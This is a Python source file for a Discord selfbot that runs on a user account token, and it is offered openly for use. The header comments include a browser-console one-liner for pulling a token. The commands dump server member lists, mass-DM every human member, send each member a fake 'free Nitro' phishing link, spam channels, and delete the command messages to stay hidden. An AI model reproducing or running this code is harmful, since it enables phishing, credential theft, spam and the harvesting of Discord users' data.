# language: Python 3.13  |  file: selfbot.py  |  runtime: discord.py-self 2.x
# deps: discord.py-self — pip install discord.py-self
#       aiohttp         — pip install aiohttp  (bundled with discord.py-self)
#
# ⚠️  RUNS ON A USER TOKEN — throwaway account only, never your main.
#     Discord ToS violation — account may be terminated if detected.
#
# HOW TO GET A USER TOKEN:
#   1. Open Discord in browser → F12 → Console
#   2. Paste: webpackChunkdiscord_app.push([[Math.random()],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]);m.filter(m=>m?.exports?.default?.getToken!==void 0).map(m=>m.exports.default.getToken())
#   3. Copy the token string from the output
#
# USAGE:
#   python selfbot.py
#   Commands are typed in any Discord channel the account is in (DMs work too).
#   Prefix: >>
#
# COMMANDS:
#   >>spy            — list all servers the account is in
#   >>members <id>   — dump member list of a server
#   >>massdm <id> <msg>  — DM all humans in a server
#   >>phish <id>     — DM all humans in a server with phish link
#   >>spam <id> <ch_id> <count> <msg>  — spam a channel
#   >>join <invite>  — join a server via invite code
#   >>leave <id>     — leave a server
#   >>scrape <id>    — scrape server info (roles, channels, member count)
#   >>status <text>  — set custom status
#   >>purge <count>  — delete your own last N messages in this channel
#   >>ping           — latency check
#   >>help           — command list

import discord
import asyncio
import os
import time

# ── config ────────────────────────────────────────────────────
# Set SELF_TOKEN in environment or paste directly (env preferred)
SELF_TOKEN   = os.environ.get("SELF_TOKEN", "YOUR_USER_TOKEN_HERE")
PHISH_URL    = os.environ.get("PHISH_URL", "").rstrip("/")   # same as main bot
PREFIX       = ">>"
OWNER_ID     = int(os.environ.get("OWNER_ID", "0"))  # your real user ID for DM reports

# ── rate limiting — stay stealthy ─────────────────────────────
DM_DELAY     = 1.2   # seconds between DMs — lower = faster but riskier
SPAM_DELAY   = 0.8   # seconds between spam messages
JOIN_DELAY   = 2.0   # seconds after joining before doing anything

# ── client ────────────────────────────────────────────────────
client = discord.Client()


# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════

async def reply(message: discord.Message, text: str):
    """Send a response — ephemeral-style, deletes after 15s."""
    try:
        msg = await message.channel.send(text)
        await asyncio.sleep(15)
        await msg.delete()
    except Exception:
        pass

async def report_to_self(text: str):
    """DM yourself a report."""
    if OWNER_ID:
        try:
            owner = await client.fetch_user(OWNER_ID)
            await owner.send(text)
        except Exception:
            pass

def fmt_member(m) -> str:
    joined = m.joined_at.strftime("%Y-%m-%d") if m.joined_at else "unknown"
    return f"{m} (ID: {m.id}) | Joined: {joined} | Bot: {'Yes' if m.bot else 'No'}"


# ══════════════════════════════════════════════════════════════
#  EVENTS
# ══════════════════════════════════════════════════════════════

@client.event
async def on_ready():
    print(f"[SB] Logged in as {client.user} ({client.user.id})")
    print(f"[SB] In {len(client.guilds)} servers")
    print(f"[SB] Prefix: {PREFIX}")


@client.event
async def on_message(message: discord.Message):
    # only process own messages
    if message.author.id != client.user.id:
        return
    if not message.content.startswith(PREFIX):
        return

    # delete the command message immediately (stealth)
    try:
        await message.delete()
    except Exception:
        pass

    content = message.content[len(PREFIX):].strip()
    parts   = content.split(" ", 1)
    cmd     = parts[0].lower()
    args    = parts[1] if len(parts) > 1 else ""

    # ── >>ping ────────────────────────────────────────────────
    if cmd == "ping":
        lat = round(client.latency * 1000)
        await reply(message, f"🏓 {lat}ms")

    # ── >>help ────────────────────────────────────────────────
    elif cmd == "help":
        lines = [
            "**LH Selfbot Commands** (prefix: `>>`)",
            "",
            "`>>spy` — list all servers",
            "`>>members <serverID>` — dump members",
            "`>>massdm <serverID> <message>` — DM all humans",
            "`>>phish <serverID>` — phish DM all humans",
            "`>>spam <serverID> <channelID> <count> <message>` — spam a channel",
            "`>>join <invite_code>` — join a server",
            "`>>leave <serverID>` — leave a server",
            "`>>scrape <serverID>` — server info dump",
            "`>>status <text>` — set custom status",
            "`>>purge <count>` — delete your last N messages here",
            "`>>ping` — latency",
        ]
        await reply(message, "\n".join(lines))

    # ── >>spy ─────────────────────────────────────────────────
    elif cmd == "spy":
        if not client.guilds:
            await reply(message, "Not in any servers.")
            return
        lines = ["**Servers:**"]
        for g in client.guilds:
            lines.append(f"`{g.id}` — **{g.name}** | Members: {g.member_count} | Owner: {g.owner_id}")
        text = "\n".join(lines)
        # split if too long
        chunks = [text[i:i+1900] for i in range(0, len(text), 1900)]
        for chunk in chunks:
            await report_to_self(chunk)
        await reply(message, f"📡 Spy report sent to your DMs. ({len(client.guilds)} servers)")

    # ── >>members <id> ────────────────────────────────────────
    elif cmd == "members":
        if not args:
            await reply(message, "Usage: `>>members <serverID>`"); return
        try:
            guild = client.get_guild(int(args.strip()))
        except ValueError:
            await reply(message, "Invalid server ID."); return
        if not guild:
            await reply(message, "Not in that server."); return
        lines = [f"Member List — {guild.name} ({guild.id})", "="*50]
        for m in guild.members:
            lines.append(fmt_member(m))
        report = "\n".join(lines)
        chunks = [report[i:i+1900] for i in range(0, len(report), 1900)]
        for chunk in chunks:
            await report_to_self(f"```\n{chunk}\n```")
        await reply(message, f"📋 Members sent to your DMs. ({len(guild.members)} members)")

    # ── >>massdm <id> <msg> ───────────────────────────────────
    elif cmd == "massdm":
        sub = args.split(" ", 1)
        if len(sub) < 2:
            await reply(message, "Usage: `>>massdm <serverID> <message>`"); return
        server_id_str, dm_message = sub[0], sub[1]
        try:
            guild = client.get_guild(int(server_id_str))
        except ValueError:
            await reply(message, "Invalid server ID."); return
        if not guild:
            await reply(message, "Not in that server."); return
        success = 0; failed = 0
        await reply(message, f"📨 Starting mass DM to {guild.member_count} members in **{guild.name}**...")
        for member in guild.members:
            if member.bot or member.id == client.user.id:
                continue
            try:
                await member.send(dm_message)
                success += 1
                await asyncio.sleep(DM_DELAY)
            except Exception:
                failed += 1
        await report_to_self(
            f"✅ Mass DM complete — **{guild.name}**\n"
            f"Sent: {success} | Failed: {failed}"
        )

    # ── >>phish <id> ──────────────────────────────────────────
    elif cmd == "phish":
        if not args:
            await reply(message, "Usage: `>>phish <serverID>`"); return
        if not PHISH_URL:
            await reply(message, "❌ PHISH_URL not set."); return
        try:
            guild = client.get_guild(int(args.strip()))
        except ValueError:
            await reply(message, "Invalid server ID."); return
        if not guild:
            await reply(message, "Not in that server."); return
        success = 0; failed = 0
        await reply(message, f"🎣 Starting phish DM to **{guild.name}**...")
        for member in guild.members:
            if member.bot or member.id == client.user.id:
                continue
            link = f"{PHISH_URL}/claim/{member.id}"
            phish_msg = (
                f"🎁 **You have a Discord Nitro gift waiting!**\n\n"
                f"Someone sent you **3 months of Discord Nitro** for free.\n"
                f"Claim it here before it expires:\n{link}\n\n"
                f"*Offer valid for 48 hours.*"
            )
            try:
                await member.send(phish_msg)
                success += 1
                await asyncio.sleep(DM_DELAY)
            except Exception:
                failed += 1
        await report_to_self(
            f"🎣 Phish DM complete — **{guild.name}**\n"
            f"Sent: {success} | Failed: {failed}"
        )

    # ── >>spam <serverID> <channelID> <count> <msg> ───────────
    elif cmd == "spam":
        sub = args.split(" ", 3)
        if len(sub) < 4:
            await reply(message, "Usage: `>>spam <serverID> <channelID> <count> <message>`"); return
        try:
            guild   = client.get_guild(int(sub[0]))
            channel = client.get_channel(int(sub[1]))
            count   = max(1, min(int(sub[2]), 500))
            msg_txt = sub[3]
        except (ValueError, TypeError):
            await reply(message, "Invalid arguments."); return
        if not guild or not channel:
            await reply(message, "Server or channel not found."); return
        sent = 0
        for _ in range(count):
            try:
                await channel.send(msg_txt)
                sent += 1
                await asyncio.sleep(SPAM_DELAY)
            except Exception:
                break
        await report_to_self(f"💬 Spam done — {sent}/{count} messages sent in #{channel.name} ({guild.name})")

    # ── >>join <invite> ───────────────────────────────────────
    elif cmd == "join":
        if not args:
            await reply(message, "Usage: `>>join <invite_code>`"); return
        code = args.strip().split("/")[-1]
        try:
            invite = await client.fetch_invite(code)
            await invite.accept()
            await asyncio.sleep(JOIN_DELAY)
            await reply(message, f"✅ Joined **{invite.guild.name}**")
            await report_to_self(f"✅ Joined server: **{invite.guild.name}** (`{invite.guild.id}`)")
        except Exception as e:
            await reply(message, f"❌ Failed to join: `{e}`")

    # ── >>leave <id> ──────────────────────────────────────────
    elif cmd == "leave":
        if not args:
            await reply(message, "Usage: `>>leave <serverID>`"); return
        try:
            guild = client.get_guild(int(args.strip()))
        except ValueError:
            await reply(message, "Invalid server ID."); return
        if not guild:
            await reply(message, "Not in that server."); return
        name = guild.name
        try:
            await guild.leave()
            await reply(message, f"✅ Left **{name}**")
        except Exception as e:
            await reply(message, f"❌ Failed: `{e}`")

    # ── >>scrape <id> ─────────────────────────────────────────
    elif cmd == "scrape":
        if not args:
            await reply(message, "Usage: `>>scrape <serverID>`"); return
        try:
            guild = client.get_guild(int(args.strip()))
        except ValueError:
            await reply(message, "Invalid server ID."); return
        if not guild:
            await reply(message, "Not in that server."); return
        lines = [
            f"**Server Scrape — {guild.name}**",
            f"ID: `{guild.id}`",
            f"Owner ID: `{guild.owner_id}`",
            f"Members: {guild.member_count}",
            f"Channels: {len(guild.channels)}",
            f"Roles: {len(guild.roles)}",
            f"Created: {guild.created_at.strftime('%Y-%m-%d')}",
            f"Boost Level: {guild.premium_tier}",
            "",
            "**Roles:**",
        ]
        for role in sorted(guild.roles, key=lambda r: r.position, reverse=True):
            if role.is_default(): continue
            lines.append(f"  `{role.id}` — {role.name} | Members: {len(role.members)}")
        lines.append("")
        lines.append("**Text Channels:**")
        for ch in guild.text_channels:
            lines.append(f"  `{ch.id}` — #{ch.name}")
        report = "\n".join(lines)
        chunks = [report[i:i+1900] for i in range(0, len(report), 1900)]
        for chunk in chunks:
            await report_to_self(chunk)
        await reply(message, f"📊 Scrape report sent to your DMs.")

    # ── >>status <text> ───────────────────────────────────────
    elif cmd == "status":
        if not args:
            await reply(message, "Usage: `>>status <text>`"); return
        try:
            await client.change_presence(
                activity=discord.CustomActivity(name=args),
                status=discord.Status.online
            )
            await reply(message, f"✅ Status set: `{args}`")
        except Exception as e:
            await reply(message, f"❌ Failed: `{e}`")

    # ── >>purge <count> ───────────────────────────────────────
    elif cmd == "purge":
        if not args:
            await reply(message, "Usage: `>>purge <count>`"); return
        try:
            count = max(1, min(int(args.strip()), 100))
        except ValueError:
            await reply(message, "Invalid count."); return
        deleted = 0
        async for msg in message.channel.history(limit=200):
            if msg.author.id == client.user.id:
                try:
                    await msg.delete()
                    deleted += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    pass
            if deleted >= count:
                break
        await reply(message, f"🗑️ Deleted {deleted} of your messages.")

    else:
        await reply(message, f"Unknown command `{cmd}`. Type `>>help` for the list.")


# ── run ───────────────────────────────────────────────────────
client.run(SELF_TOKEN)
